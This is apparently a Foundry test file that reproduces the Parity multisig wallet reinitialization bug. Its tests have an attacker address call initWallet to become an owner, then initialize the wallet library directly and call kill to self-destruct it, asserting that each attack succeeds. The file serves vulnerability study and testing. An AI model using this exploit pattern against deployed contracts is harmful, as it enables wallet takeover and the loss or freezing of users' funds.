// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/parity_wallet_bug_1.sol";

contract WalletTest is Test {
    Wallet wallet;
    address[] owners;
    address attacker = address(0xbad);
    address owner1 = address(0x1);
    address owner2 = address(0x2);
    uint256 requiredConfirmations = 2;
    uint256 dailyLimit = 1 ether;

    function setUp() public {
        owners.push(owner1);
        owners.push(owner2);
        wallet = new Wallet(owners, requiredConfirmations, dailyLimit);
    }

    function testReinitializationVulnerability() public {
        // Initial state check - original owners should be set
        assertTrue(wallet.isOwner(owner1));
        assertTrue(wallet.isOwner(owner2));

        // Attacker tries to reinitialize the wallet with themselves as owner
        vm.prank(attacker);
        address[] memory newOwners = new address[](1);
        newOwners[0] = attacker;

        // Call initWallet directly through delegatecall
        (bool success,) = address(wallet).call(
            abi.encodeWithSignature(
                "initWallet(address[],uint256,uint256)",
                newOwners,
                1,
                dailyLimit
            )
        );

        // Verify the attack was successful (reinitialization worked)
        assertTrue(success);
        assertTrue(wallet.isOwner(attacker));
        // Original owners should still be present due to delegatecall behavior
        assertTrue(wallet.isOwner(owner1));
        assertTrue(wallet.isOwner(owner2));
    }

    function testLibraryReinitializationVulnerability() public {
        // Get the wallet library address
        address walletLibrary;
        assembly {
            walletLibrary := sload(0)
        }

        // Attacker tries to initialize the library contract directly
        vm.prank(attacker);
        address[] memory newOwners = new address[](1);
        newOwners[0] = attacker;

        (bool success,) = walletLibrary.call(
            abi.encodeWithSignature(
                "initMultiowned(address[],uint256)",
                newOwners,
                1
            )
        );

        // Verify the attack was successful
        assertTrue(success);

        // Now attacker can kill the library
        vm.prank(attacker);
        (success,) = walletLibrary.call(
            abi.encodeWithSignature("kill(address)", attacker)
        );
        assertTrue(success);
    }
}
